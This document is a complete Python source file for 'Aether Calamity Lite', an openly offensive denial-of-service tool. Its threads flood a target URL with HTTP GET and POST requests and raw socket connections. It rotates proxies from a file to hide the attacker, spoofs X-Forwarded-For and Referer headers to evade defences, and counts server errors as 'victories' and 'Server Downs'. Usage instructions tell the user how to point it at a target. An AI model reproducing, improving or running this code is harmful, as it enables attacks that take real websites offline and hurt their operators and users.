#!/usr/bin/env python3
# ╔═══════════════════════════════════════════════════════════════╗
# ║                                                               ║
# ║   █████╗ ███████╗████████╗██╗  ██╗███████╗██████╗            ║
# ║  ██╔══██╗██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗           ║
# ║  ███████║█████╗     ██║   ███████║█████╗  ██████╔╝           ║
# ║  ██╔══██║██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗           ║
# ║  ██║  ██║███████╗   ██║   ██║  ██║███████╗██║  ██║           ║
# ║  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝           ║
# ║                                                               ║
# ║                 AETHER CALAMITY LITE v3.0                    ║
# ║              Lightweight Edition + Proxy Support             ║
# ║                                                               ║
# ╚═══════════════════════════════════════════════════════════════╝

import threading
import requests
import sys
import time
import random
import socket
import os
from concurrent.futures import ThreadPoolExecutor
from random import uniform, randint
from datetime import datetime

# ==================== COLOR CODES ====================
class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    BLINK = "\033[5m"

# ==================== LIGHTWEIGHT CONFIG ====================
MAX_THREADS = 5000
ENABLE_PROXY = True  # Enable proxy support
BYPASS_MODE = True
NO_RETRY_MODE = True
PROXY_ROTATION = True  # Rotate proxies
MAX_PROXY_PER_THREAD = 10  # Max proxies per thread rotation

class AetherCalamityLite:
    def __init__(self, target_url, thread_count):
        self.target_url = target_url
        self.thread_count = min(thread_count, MAX_THREADS)
        self.attack_running = True
        self.request_count = 0
        self.success_count = 0
        self.error_count = 0
        self.bytes_sent = 0
        self.packets_sent = 0
        self.victory_log = []
        self.start_time = time.time()
        
        # Load proxies from proxy.txt
        self.proxy_list = self.load_proxies_from_file()
        
        # Simple user agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        ]
        
        # Extract target info
        self.target_ip = self.extract_ip(target_url)
        self.target_port = self.extract_port(target_url)
        
        print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}AETHER CALAMITY LITE v3.0 - PROXY EDITION{Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}")
    
    def load_proxies_from_file(self):
        """Load proxies from proxy.txt file"""
        proxies = []
        proxy_file = "proxy.txt"
        
        try:
            if os.path.exists(proxy_file):
                with open(proxy_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            # Validate proxy format
                            if ':' in line:
                                proxies.append(line)
                                if len(proxies) >= 1000:  # Limit to 1000 proxies max
                                    break
                
                print(f"{Colors.GREEN}[+]{Colors.RESET} Loaded {Colors.YELLOW}{len(proxies)}{Colors.RESET} proxies from {Colors.CYAN}{proxy_file}{Colors.RESET}")
                
                # Display some loaded proxies
                if proxies:
                    print(f"{Colors.GREEN}[+]{Colors.RESET} Sample proxies:")
                    for i, proxy in enumerate(proxies[:3]):
                        print(f"  {Colors.YELLOW}{i+1}.{Colors.RESET} {Colors.CYAN}{proxy}{Colors.RESET}")
                    if len(proxies) > 3:
                        print(f"  {Colors.YELLOW}...{Colors.RESET} and {len(proxies)-3} more")
            else:
                print(f"{Colors.YELLOW}[!]{Colors.RESET} {Colors.RED}proxy.txt not found! Running without proxies.{Colors.RESET}")
                print(f"{Colors.YELLOW}[!]{Colors.RESET} Create {Colors.CYAN}proxy.txt{Colors.RESET} file with one proxy per line")
                print(f"{Colors.YELLOW}[!]{Colors.RESET} Format: {Colors.GREEN}ip:port{Colors.RESET} or {Colors.GREEN}ip:port:user:pass{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[!]{Colors.RESET} Error loading proxies: {str(e)}")
        
        return proxies
    
    def get_random_proxy(self):
        """Get random proxy from loaded list"""
        if ENABLE_PROXY and self.proxy_list and PROXY_ROTATION:
            return random.choice(self.proxy_list)
        return None
    
    def get_proxy_dict(self, proxy_str):
        """Convert proxy string to requests proxy dict"""
        if not proxy_str:
            return None
        
        try:
            # Check if proxy has authentication
            if proxy_str.count(':') == 3:
                # Format: ip:port:user:pass
                parts = proxy_str.split(':')
                ip_port = f"{parts[0]}:{parts[1]}"
                username = parts[2]
                password = parts[3]
                
                # Format: http://user:pass@ip:port
                proxy_url = f"http://{username}:{password}@{ip_port}"
            else:
                # Format: ip:port
                proxy_url = f"http://{proxy_str}"
            
            return {
                'http': proxy_url,
                'https': proxy_url
            }
        except:
            # If parsing fails, use basic format
            return {
                'http': f"http://{proxy_str}",
                'https': f"http://{proxy_str}"
            }
    
    def extract_ip(self, url):
        """Extract IP from URL"""
        try:
            if "http" in url:
                from urllib.parse import urlparse
                parsed = urlparse(url)
                return socket.gethostbyname(parsed.hostname)
            return url
        except:
            return url
    
    def extract_port(self, url):
        """Extract port from URL"""
        try:
            if "http" in url:
                from urllib.parse import urlparse
                parsed = urlparse(url)
                return parsed.port or (443 if parsed.scheme == "https" else 80)
            return 80
        except:
            return 80
    
    def get_lightweight_headers(self):
        """Get lightweight bypass headers"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive' if random.random() > 0.3 else 'close',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        
        # Add random headers for bypass
        if random.random() > 0.5:
            headers['Referer'] = random.choice([
                'https://www.google.com/',
                'https://www.facebook.com/',
                'https://twitter.com/'
            ])
        
        if random.random() > 0.7:
            headers['X-Forwarded-For'] = f'{randint(1,255)}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}'
        
        return headers
    
    def socket_flood_lite(self):
        """Ultra-light socket flood"""
        while self.attack_running:
            try:
                # Create single socket for speed
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.03)
                
                try:
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Simple GET request
                    payload = (
                        f"GET /{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(self.user_agents)}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: keep-alive\r\n\r\n"
                    )
                    
                    bytes_sent = sock.send(payload.encode())
                    self.bytes_sent += bytes_sent
                    self.packets_sent += 1
                    
                except:
                    pass
                finally:
                    try:
                        sock.close()
                    except:
                        pass
                
                # Minimal delay for maximum speed
                time.sleep(0.0005)
                
            except:
                continue
    
    def http_flood_lite(self, thread_id):
        """Lightweight HTTP flood with proxy support"""
        session = requests.Session()
        
        if NO_RETRY_MODE:
            from requests.adapters import HTTPAdapter
            adapter = HTTPAdapter(max_retries=0, pool_connections=50, pool_maxsize=50)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
        
        # Thread-specific proxy rotation
        thread_proxies = []
        if self.proxy_list:
            thread_proxies = random.sample(self.proxy_list, min(MAX_PROXY_PER_THREAD, len(self.proxy_list)))
        
        proxy_index = 0
        
        while self.attack_running:
            try:
                # Ultra-fast requests with minimal delay
                time.sleep(uniform(0.0001, 0.001))
                
                headers = self.get_lightweight_headers()
                
                # Proxy rotation
                proxies = None
                if thread_proxies:
                    proxy_str = thread_proxies[proxy_index % len(thread_proxies)]
                    proxies = self.get_proxy_dict(proxy_str)
                    proxy_index += 1
                
                # Alternate between GET and POST
                if random.random() > 0.7:
                    # Small POST data
                    response = session.post(
                        self.target_url,
                        headers=headers,
                        data={'data': 'x' * random.randint(50, 200)},
                        proxies=proxies,
                        timeout=1.0,  # Slightly longer timeout for proxies
                        verify=False
                    )
                else:
                    # Fast GET request
                    response = session.get(
                        self.target_url,
                        headers=headers,
                        proxies=proxies,
                        timeout=1.0,
                        verify=False
                    )
                
                self.request_count += 1
                
                # Track bytes
                if response.content:
                    self.bytes_sent += len(response.content)
                
                # Check for victory
                status = response.status_code
                if status == 200:
                    self.success_count += 1
                elif status >= 500:
                    victory_msg = f"[Thread {thread_id}] Server error: {status}"
                    self.victory_log.append(victory_msg)
                
            except requests.exceptions.ProxyError:
                # Proxy error - try next proxy
                self.error_count += 1
                continue
            except requests.exceptions.ConnectTimeout:
                # Connection timeout
                self.error_count += 1
                continue
            except:
                self.error_count += 1
                # Fast recovery on error
                continue
    
    def cpu_boost(self):
        """Light CPU load for performance boost"""
        while self.attack_running:
            # Simple but effective CPU load
            _ = sum(i * i for i in range(1000))
            time.sleep(0.001)
    
    def start_attack(self):
        """Start the lightweight attack"""
        # Display attack info
        info_box = f"""
{Colors.CYAN}┌──────────────────────────────────────────────────────────┐{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.BOLD}{Colors.GREEN}TARGET:{Colors.RESET} {Colors.YELLOW}{self.target_url}{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.BOLD}{Colors.GREEN}IP:{Colors.RESET} {Colors.YELLOW}{self.target_ip}:{self.target_port}{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.BOLD}{Colors.GREEN}THREADS:{Colors.RESET} {Colors.YELLOW}{self.thread_count}{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.BOLD}{Colors.GREEN}PROXIES:{Colors.RESET} {Colors.CYAN}{len(self.proxy_list)}{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.BOLD}{Colors.GREEN}MODE:{Colors.RESET} {Colors.RED}PROXY POWER{Colors.RESET}
{Colors.CYAN}└──────────────────────────────────────────────────────────┘{Colors.RESET}
"""
        print(info_box)
        
        # Proxy stats
        if self.proxy_list:
            print(f"{Colors.GREEN}[+]{Colors.RESET} Proxy rotation: {Colors.YELLOW}ENABLED{Colors.RESET}")
            print(f"{Colors.GREEN}[+]{Colors.RESET} Proxies per thread: {Colors.CYAN}{min(MAX_PROXY_PER_THREAD, len(self.proxy_list))}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[!]{Colors.RESET} Running {Colors.RED}without proxies{Colors.RESET} (direct connection)")
        
        print(f"\n{Colors.GREEN}[+]{Colors.RESET} Starting attack...")
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Press {Colors.RED}CTRL+C{Colors.RESET} to stop\n")
        
        # Start CPU boost
        for _ in range(min(10, os.cpu_count() or 2)):
            threading.Thread(target=self.cpu_boost, daemon=True).start()
        
        # Start socket flood (direct connection)
        for _ in range(min(100, self.thread_count // 10)):
            threading.Thread(target=self.socket_flood_lite, daemon=True).start()
        
        # Start HTTP flood with thread pool
        with ThreadPoolExecutor(max_workers=min(self.thread_count, 500)) as executor:
            for i in range(self.thread_count):
                executor.submit(self.http_flood_lite, i+1)
        
        try:
            # Real-time stats display
            last_count = 0
            last_time = time.time()
            stats_counter = 0
            
            while True:
                current_time = time.time()
                elapsed = current_time - last_time
                
                if elapsed >= 1.0:  # Update every second
                    current_count = self.request_count
                    req_per_sec = (current_count - last_count) / elapsed if elapsed > 0 else 0
                    
                    # Clear and display stats
                    os.system('clear' if os.name == 'posix' else 'cls')
                    
                    print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}")
                    print(f"{Colors.BOLD}{Colors.MAGENTA}AETHER CALAMITY LITE - PROXY ATTACK{Colors.RESET}")
                    print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}")
                    
                    # Display target info
                    print(f"{Colors.GREEN}›{Colors.RESET} Target: {Colors.YELLOW}{self.target_url}{Colors.RESET}")
                    print(f"{Colors.GREEN}›{Colors.RESET} Running: {Colors.CYAN}{time.strftime('%H:%M:%S', time.gmtime(current_time - self.start_time))}{Colors.RESET}")
                    print(f"{Colors.GREEN}›{Colors.RESET} Active Proxies: {Colors.CYAN}{len(self.proxy_list)}{Colors.RESET}")
                    
                    print(f"\n{Colors.CYAN}{'─' * 60}{Colors.RESET}")
                    
                    # Stats in simple format
                    stats = f"""
{Colors.WHITE}REQUESTS: {Colors.GREEN}{self.request_count:,}{Colors.RESET}
{Colors.WHITE}RPS:      {Colors.YELLOW}{req_per_sec:,.0f}/s{Colors.RESET}
{Colors.WHITE}SUCCESS:  {Colors.GREEN}{self.success_count:,}{Colors.RESET}
{Colors.WHITE}ERRORS:   {Colors.RED}{self.error_count:,}{Colors.RESET}
{Colors.WHITE}BYTES:    {Colors.CYAN}{self.bytes_sent:,}{Colors.RESET}
{Colors.WHITE}PACKETS:  {Colors.MAGENTA}{self.packets_sent:,}{Colors.RESET}
{Colors.WHITE}VICTORIES:{Colors.RED} {len(self.victory_log)}{Colors.RESET}
"""
                    print(stats)
                    
                    # Simple progress bar
                    intensity = min(100, (self.request_count % 5000) / 50)
                    bar_length = 40
                    filled = int(bar_length * intensity / 100)
                    bar = f"{Colors.RED}{'█' * filled}{Colors.YELLOW}{'░' * (bar_length - filled)}{Colors.RESET}"
                    print(f"\n{Colors.WHITE}INTENSITY: {bar} {intensity:.0f}%{Colors.RESET}")
                    
                    # Proxy efficiency
                    if self.proxy_list and stats_counter % 5 == 0:
                        efficiency = (self.success_count / max(1, self.request_count)) * 100
                        color = Colors.GREEN if efficiency > 70 else Colors.YELLOW if efficiency > 40 else Colors.RED
                        print(f"\n{Colors.WHITE}PROXY EFFICIENCY: {color}{efficiency:.1f}%{Colors.RESET}")
                    
                    print(f"\n{Colors.CYAN}{'─' * 60}{Colors.RESET}")
                    
                    # Show recent victories
                    if self.victory_log:
                        print(f"\n{Colors.GREEN}[+]{Colors.RESET} Recent victories:")
                        for log in self.victory_log[-2:]:
                            print(f"  {Colors.YELLOW}→{Colors.RESET} {log}")
                    
                    print(f"\n{Colors.YELLOW}[!]{Colors.RESET} Attack active {Colors.BLINK}{Colors.RED}▶{Colors.RESET}")
                    
                    # Reset counters
                    last_count = current_count
                    last_time = current_time
                    stats_counter += 1
                
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            self.attack_running = False
            print(f"\n\n{Colors.RED}{'═' * 60}{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.RED}ATTACK STOPPED{Colors.RESET}")
            print(f"{Colors.RED}{'═' * 60}{Colors.RESET}")
            
            # Final stats
            total_time = time.time() - self.start_time
            avg_rps = self.request_count / total_time if total_time > 0 else 0
            
            final = f"""
{Colors.CYAN}┌──────────────────────────────────────────────────────────┐{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.BOLD}{Colors.WHITE}FINAL STATISTICS{Colors.RESET}                                  {Colors.CYAN}│{Colors.RESET}
{Colors.CYAN}├──────────────────────────────────────────────────────────┤{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.GREEN}✓{Colors.RESET} Total Time:    {Colors.YELLOW}{total_time:.1f}s{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.GREEN}✓{Colors.RESET} Total Requests: {Colors.YELLOW}{self.request_count:,}{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.GREEN}✓{Colors.RESET} Avg RPS:        {Colors.YELLOW}{avg_rps:,.0f}/s{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.GREEN}✓{Colors.RESET} Bytes Sent:     {Colors.YELLOW}{self.bytes_sent:,}{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.GREEN}✓{Colors.RESET} Proxies Used:   {Colors.CYAN}{len(self.proxy_list)}{Colors.RESET}
{Colors.CYAN}│{Colors.RESET} {Colors.GREEN}✓{Colors.RESET} Server Downs:   {Colors.RED}{len(self.victory_log)}{Colors.RESET}
{Colors.CYAN}└──────────────────────────────────────────────────────────┘{Colors.RESET}
"""
            print(final)
            print(f"{Colors.GREEN}[+]{Colors.RESET} {Colors.CYAN}AETHER CALAMITY LITE - Mission Complete{Colors.RESET}")
            sys.exit(0)

def main():
    """Main function"""
    if len(sys.argv) != 3:
        print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}AETHER CALAMITY LITE v3.0 - PROXY EDITION{Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}")
        print(f"\n{Colors.YELLOW}Usage:{Colors.RESET}")
        print(f"  {Colors.GREEN}python3 aether-lite.py <target_url> <threads>{Colors.RESET}")
        print(f"\n{Colors.YELLOW}Example:{Colors.RESET}")
        print(f"  {Colors.CYAN}python3 aether-lite.py https://example.com 3000{Colors.RESET}")
        print(f"\n{Colors.YELLOW}Proxy Setup:{Colors.RESET}")
        print(f"  1. Create {Colors.CYAN}proxy.txt{Colors.RESET} file")
        print(f"  2. Add proxies (one per line): {Colors.GREEN}ip:port{Colors.RESET}")
        print(f"  3. Or with auth: {Colors.GREEN}ip:port:user:pass{Colors.RESET}")
        print(f"\n{Colors.YELLOW}Note:{Colors.RESET}")
        print(f"  {Colors.WHITE}Threads: 100-5000 (optimized for speed){Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 60}{Colors.RESET}")
        sys.exit(1)
    
    try:
        target_url = sys.argv[1]
        threads = int(sys.argv[2])
        
        # Quick validation
        if threads < 100:
            print(f"{Colors.YELLOW}[!] Minimum threads: 100 (setting to 100){Colors.RESET}")
            threads = 100
        elif threads > MAX_THREADS:
            print(f"{Colors.YELLOW}[!] Maximum threads: {MAX_THREADS} (setting to max){Colors.RESET}")
            threads = MAX_THREADS
        
        # Check if running in Termux
        if 'com.termux' in os.environ.get('PREFIX', ''):
            print(f"{Colors.GREEN}[+]{Colors.RESET} Termux detected - Optimizing...")
        
        print(f"{Colors.GREEN}[+]{Colors.RESET} Starting Aether Calamity Lite...")
        print(f"{Colors.GREEN}[+]{Colors.RESET} Target: {Colors.YELLOW}{target_url}{Colors.RESET}")
        print(f"{Colors.GREEN}[+]{Colors.RESET} Threads: {Colors.CYAN}{threads}{Colors.RESET}")
        
        # Start attack
        attacker = AetherCalamityLite(target_url, threads)
        attacker.start_attack()
        
    except ValueError:
        print(f"{Colors.RED}[!] Error: Threads must be a number{Colors.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()